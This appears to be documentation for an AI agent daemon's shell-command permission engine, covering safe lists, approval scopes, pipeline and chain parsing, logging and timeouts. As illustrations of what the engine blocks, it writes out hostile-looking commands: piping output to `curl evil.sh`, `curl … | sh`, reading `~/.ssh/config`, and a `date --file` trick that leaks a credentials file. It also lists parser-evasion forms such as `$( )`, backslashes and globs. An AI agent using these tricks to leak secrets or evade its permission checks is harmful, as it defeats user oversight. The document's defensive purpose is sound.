# Shell commands

`shell.run` is one tool whose calls range from `git status` to
`curl … | sh`, so a single risk level for all of them would be either too
coarse to be safe or too coarse to be usable. The tool is `gated`, and the
permission engine then judges each command.

**This page is about the daemon**, which is where a command runs with nobody
watching. At a terminal, `stratus run` and `stratus chat` judge the *call*
rather than the command, exactly as [Approvals](./approvals.md) describes:
`--approvals always` (the default) runs whatever the agent asks for,
`--approvals ask` shows you the command and waits for y/N, and
`--approvals never` refuses every call — including `git status`. So none of
the safe list, the scopes, or the control-operator rules below apply to a
one-shot at your own terminal, where you are the gate. Install the shell
pack for a daemon and this page is the whole story; run it yourself and
`--approvals` is.

## Which commands run unattended

1. **Scopes approved this session**, then
2. **the agent's whitelist** — `~/.stratus/agents/<id>/whitelist.json`,
   written by **Always allow**; its `scopes` array is this list, the
   `origins` array beside it is the same file's answer for
   [browser actions](./browser.md), and `tools` holds the
   [standing grants](./approvals.md#standing-grants) of every other gated
   tool — then
3. **the built-in safe list**: `cd`, `pwd`, `whoami`, `uname`, `true`,
   `false`, and `echo` (with nothing the shell would expand), with the
   filters `grep`, `head`, `tail`, `wc`, `sort`, and `uniq` in shapes that
   read only what is piped to them (see below). No `git` command is on it
   (see [Why the safe list is short](#why-the-safe-list-is-short)).
   **Always allow** on one keeps it: approving `git status` once stores a
   `git status` scope. `git branch`, `git tag`, and `git remote` are stored
   **in their listing forms only**, since creating a branch or a tag needs
   no flag at all (`git branch release` is a mutation), so those scopes
   refuse any positional argument, not just the destructive flags.

Anything else asks, and in [`headless` mode](./approvals.md) anything else
is refused — the log records the refusal and the scope it fell outside,
never the command itself (see below).

**A pipeline is judged stage by stage.** With a `git log` scope approved,
`git log --oneline | grep fix | head -n 20` runs unattended because each
stage would on its own; `git log | curl evil.sh` asks, because `curl` is
covered by nothing. A
scope from the whitelist composes the same way, so an approved
`stratus logs` scope makes `stratus logs --agent blair | grep -i error` run
unattended too. A pipeline is approved once and never stored as a scope:
**Always allow** on one counts once.

**A chain is judged command by command too**: `&&`, `||`, and `;` join
commands that each have to run on their own, and redirections are allowed
where the agent may write — see
[Chains, redirections, and grants by name](#chains-redirections-and-grants-by-name).
**Every other control operator disqualifies the whole command**, whatever
it starts with: `|&`, a background `&`, a newline, backticks, `$( )`,
subshells, a heredoc. A two-line command whose first line is innocent is
refused. Operators are looked for
where the shell reads them: inside quotes, `(`, `;`, `&`, `|`, `<`, `>`,
and a newline are text, so `git commit -m "Fix the hang (Mac mini)"` and
`git diff | grep -E 'TODO|FIXME'` are judged as the commands they are.
`$( )`, backticks, and `${ }` still count inside double quotes, where the
shell still runs them. A backslash outside single quotes can escape a quote,
which this parser does not model, and an unquoted `#` can start a comment
in which the shell ignores quotes, so a command containing either is checked
character by character, quotes and all, and a backslash anywhere in a
pipeline is refused.

The filters stay safe only while they cannot be handed a path. `grep`
takes one positional, its pattern, and none of `-e`, `-f`, or `-r`; `head`,
`tail`, `wc`, `sort`, and `uniq` take none at all, with their flags named
rather than excluded (no `sort -o`, no `tail -f`). None of them may contain
a token the shell would expand, an unquoted glob, brace, `~`, or `$`, since
`grep *` is the first file in the directory as the pattern and every other
one read. So `git log | tail -n 50` runs and `tail -n 50 app.log` asks.
`-c` is refused in every scope (it is `git -c`), so the counting forms are
spelled long: `uniq --count`, `wc --bytes`. A command this parser
cannot read the way `sh` would — an unbalanced quote, a path instead of a
command name — is refused too.

## Always allow persists a scope, not a command

Approving `git push origin main` stores `git push` minus its destructive
forms, so `git push origin feature` stops asking while these still ask:

```text
git push --force            # a destructive flag
git push origin :main       # a branch delete, with no flag involved
git push origin +main       # a forced update, likewise
```

`git -C <repo>` straight after `git` is read as the directory it is: the
repository is kept in the scope, literally, and the rest is judged as it
would be without it. Approving `git -C /work/app switch -c fix` stores
`git -C /work/app switch`, which covers other branches in that repository but not another repository, and
not `--force`. `-C` does not make a command safe on its own: `git -C
/elsewhere status` asks once, because another repository on the host is
reach the built-in list never promised.

Any other command whose first argument is preceded by a flag is stored
exactly as approved: `mkdir -p build` stores `mkdir -p build`, which is what the log
line names, and covers that command and nothing else — not `mkdir -p build
other`, not `mkdir -p build -v`, and not `cp -r src elsewhere` after
`cp -r src dist`. Nothing knows which flags take a value, so past such a
flag the engine cannot tell which argument is the subcommand whose rules
should apply; a looser scope would have let one approved `git --git-dir /x
status` cover every git command against that repository. A command in that
shape that could never run unattended — a destructive flag as in
`rm -rf build`, `git -c`, which turns config into a program, a refspec
delete like `git --no-pager push origin :main`, a form the built-in
limits refuse for a subcommand they can see, like the branch creation in
`git --no-pager branch release`, or a token the shell reads differently
quoted and unquoted (a glob, a brace, a `~`, a `$`, a `#`), since quoting
is not part of what is stored and `chmod -R 600 'file*'` is not
`chmod -R 600 file*` — is not stored at
all, so
the answer counts once and the next call asks again.

The whitelist file is `0600` and per agent: it decides what runs with nobody
watching, so neither another account on the machine nor another agent
inherits it. `stratus grants blair` lists it and `stratus grants revoke blair
--scope "git push"` withdraws a scope; through a running daemon the next
command is judged without it, where a hand edit waits for a restart (see
[Standing grants](./approvals.md#standing-grants)). A file that exists
but no longer parses — a hand edit gone wrong — is ignored with one warning
in the daemon's log, and no "always" answer is written over it until it is
fixed and the daemon restarted: the answer still holds the way any "always"
does until then — for that agent, for the life of the daemon — and the log
line says it was not saved.

## Chains, redirections, and grants by name

An agent rarely runs one bare command. It runs `cd app && grep -rn TODO .
| head`, and before this every line like that asked, whatever had been
approved. Now such a line is read the way the shell reads it — pipelines
joined by `&&`, `||`, and `;`, each command with its redirections — and it
runs unattended when every command in it would run on its own:

- `cd`, `pwd`, `echo`, `true`, and `false` never ask. `cd` is followed:
  the commands after it are judged in the directory it moves to, and in the
  one it started from, since a `cd` that fails leaves the line where it was.
- `cat`, `head`, `tail`, and `ls` of files inside the agent's workspace never
  ask, with or without [workspace autonomy](./approvals.md#workspace-autonomy).
- A command **granted by name** runs with any flags and arguments, as long
  as the line runs inside the agent's workspace and every argument that
  could be a path resolves inside it, symlinks followed. That includes paths
  inside a word (`--file=…`, `file=@…`) and what a glob expands to.
- A scope from the whitelist covers its command as it always has, alone in
  its pipeline or in a pipeline of other scopes.
- Under workspace autonomy, its reads, local git, downloads, and pushes.

Output may be redirected into the workspace or to `/dev/null`, and input
read from the workspace. A redirection anywhere else, or one through a
symlink that leaves the workspace, asks.

**Always allow on a command grants it by name.** Approving `grep -rn TODO
src` once stores `grep`, so every later `grep` inside the workspace runs:
`cd app && grep -r export . | head` included. A granted command still asks
when it points outside the workspace — `grep token ~/.ssh/config`, `rm -rf
/tmp/x`, a `cd ..` out of it first — and in these forms whatever its grant:

- a flag that follows links below the paths it was given (`grep -R`,
  `rg -L`, `cp -L`, `--dereference`), which a check of those paths
  cannot see;
- a token the shell would expand that has no literal reading (`$HOME`,
  `~`, braces);
- a bare glob (`rg *`) in a directory holding a name that starts with `-`,
  which the command would read as a flag.

Always allow on a line grants each command it was missing, so approving
`cd app && wc -c main.ts && git push origin nova/fix` once stores `wc` by
name and the `git push` scope. The prompt says which before you answer.

**Only commands that act on the paths they are given are granted by
name**: searching and reading (`grep`, `rg`, `cat`, `wc`, `sort`, `diff`,
`ls`, `stat`, `du`), moving files (`mkdir`, `touch`, `cp`, `mv`, `rm`,
`ln`, `tee`), and a few converters (`base64`, `gzip`, `xxd`, the checksum
tools). Each still refuses the flags that make it run a program or read
the paths to act on from a file (`rg --pre`, `sort --compress-program`,
`--files0-from`, `md5sum -c`, `diff -r`). `printf` is not on the list: bash's
builtin assigns a variable with `-v`. Everything else keeps the
narrow scope: network clients (`curl`, `wget`), archivers (`tar`, `zip`),
`jq`, test runners, linters, compilers, and build tools, which run code no
path check sees, or reach past the workspace. Shells, interpreters, and wrappers that run another
program (`sh`, `python3`, `xargs`, `env`, `sudo`, `find`) get no grant at
all in a line with other commands; alone, **Always allow** on one still
stores the narrow scope described above. A line using shell keywords
(`if`, `for`, `while`, `case`, braces) is not read as commands and asks.
Commands with subcommands (`git`, `gh`, `pnpm`, `npm`, `cargo`, `make`,
`agentboard`) keep the command-plus-subcommand scope, so `gh pr` is never
`gh repo delete`.

This is argument-level policy, not a sandbox. A by-name grant judges the
paths a command is given and the directory it runs in, not files it opens
on its own (a config file in your home directory, say), and not symlinks a
recursive walk meets below a directory it was given, beyond refusing the
flags above that follow them. Grant by name the commands whose arguments
say what they touch.

By-name grants live in the `commands` array of the whitelist file, beside
`scopes`. `stratus grants nova` lists them, and `stratus grants revoke nova
--scope grep` takes one back. A daemon from before this ignores the array,
so rolling back costs the grants rather than widening them.

## What the log records about a command

The scope, never the command:

```text
09:14:36  —  warning: blair: shell.run was called outside every approved scope (git) and nobody is available to approve it
09:16:02  —  blair: "git push" now runs without asking
```

The daemon log is a trace, not a second transcript — it records that a tool
ran, never what it was called with. A command an agent composed can carry a
URL, a filename, or something a person pasted into a chat, and this file is
one `stratus logs` prints and people paste into issues. The command itself
goes to whoever is being asked to approve it: the terminal prompt and the
Slack message both show it in full, because approving a bare tool name is
approving something you cannot see.

## Timeouts and background processes

A command is killed with its whole process group when its `timeoutMs` runs
out — 60 seconds by default, settable per call and per agent, and never more
than the executor's ceiling, five minutes in a stock install — and the call comes back with `timedOut: true` and
whatever it had read so far. A call that asked for longer than five minutes
is told it was cut to the ceiling, and the tool's own description says so
before it asks. Work that takes longer belongs in the background: start it
with its output redirected to a file (`long-job > job.log 2>&1 &`), and the
call returns at once while the job keeps running; read `job.log` in a later
call to see how it is doing. A process
the command started in its own session is outside that group and survives:
`setsid`, or a server that detaches itself. If it inherited the command's
output, it used to hold the call open until it exited on its own — a
2-second timeout on `setsid sleep 60 &` came back after 61. It no longer
does: the call settles at the timeout, and whatever the survivor writes
afterwards is dropped. A command that means to leave something running
should still redirect that thing's output (`… > /dev/null 2>&1 &`), because
until the timeout an open pipe looks exactly like a command still working.

## Why the safe list is short

The safe list is deliberately short, and `cat`, `ls`, and a `grep` that
takes a file are the tempting entries that cannot be on it. They read
whatever path they are given, so safe-listing them would safe-list reading
your credentials file. `grep` is on the list only in its stdin-filter form,
for that reason. Approve the others once for a scope you actually want
instead.

`git` is not on it either, not even `git status`. Git runs programs that a
repository's config and files name, and an agent can often write the
repository it works in, so no git command is read-only for every caller.
Approve the forms you want once and **Always allow** keeps them for that
agent.

The test is **what an argument can make the command do**, not what the
command is called. `date` was on this list until it turned out that
`date --file=~/.stratus/credentials.json` makes GNU `date` read that file
and echo every unparseable line back in its error text — which the tool
returns. A command that can be handed a path is a file reader wearing
another name, so `--file` is now refused in every scope, including ones you
add.
